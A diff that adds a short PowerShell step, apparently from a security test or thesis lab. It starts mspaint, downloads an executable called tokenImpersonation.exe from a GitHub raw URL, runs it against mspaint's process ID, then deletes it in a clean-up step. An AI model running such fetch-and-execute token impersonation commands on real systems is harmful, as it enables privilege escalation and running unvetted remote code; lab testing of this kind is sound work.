@@ -1,0 +1,13 @@
+
+
+
+
+
+mspaint
+Invoke-WebRequest -Uri https://github.com/PaulaMerino/TFM/raw/main/exec/tokenImpersonation.exe -OutFile "$env:USERPROFILE\Downloads\tokenImpersonation.exe"
+& "$env:USERPROFILE\Downloads\tokenImpersonation.exe" (Get-Process | ?{$_.ProcessName -eq "mspaint"} | Select-Object -ExpandProperty Id)
+
+
+
+CLEAN UP
+Remove-Item "$env:USERPROFILE\Downloads\tokenImpersonation.exe"
